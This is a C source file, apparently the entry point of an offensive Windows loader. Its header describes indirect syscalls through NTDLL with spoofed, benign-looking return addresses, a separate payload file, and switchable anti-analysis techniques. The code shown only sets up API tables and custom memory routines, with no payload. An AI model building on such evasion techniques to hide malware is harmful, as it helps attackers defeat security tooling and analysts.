/*
*
* _DLOGA program that uses indirect syscall with arbitrary return addresses inside NTDLL.DLL.
* The return addresses will be utilizing benign APIs which look unsuspicious, like the ones
* for file operation.
*
* Payload is defined in 'payload.h'.
*
* Techniques of anti analysis are all in 'anti_anlysis.c', modify 'anti_anlysis.h' to activate
* or deactive certain anti analysis techniques; main switch for anti analysis is defined in
* common.h as '_ANTI_ANALYSIS'.
*
*/

#include <windows.h>
#include <stdio.h>
#include "apisets.h"
#include "log.h"

MAL_NT_API_TBL g_mal_nt_api_tbl = { 0 };
WIN_API_TBL g_win_api_tbl = { 0 };

// mingw definition
void * __cdecl memcpy(void * __restrict__ _dst, const void * __restrict__ _src, size_t _size) __MINGW_ATTRIB_DEPRECATED_SEC_WARN
{
    for (volatile int i = 0; i < _size; i++)
        ((BYTE*)_dst)[i] = ((BYTE*)_src)[i];

    return _dst;
}

extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* dest, int value, size_t size)
{
        unsigned char* p = (unsigned char*)dest;
        while (size > 0)
        {
                *p = (unsigned char)value;
                p++;
                size--;
        }
        return dest;
}

int woohoo(int argc, char** argv)
{
	// initializing the used syscalls
	if (!init_nt_syscalls())
	{
		_DLOGA("[-]Failed to initialize NT API sets ... Abort ...\n");
		return -1;
	}

    if (!init_win_api())
    {
		_DLOGA("[-]Failed to initialize windows API sets ... Abort ...\n");
		return -1;
    }

	_DLOGA("[*]API initialization done... \n");

	return 0;
}

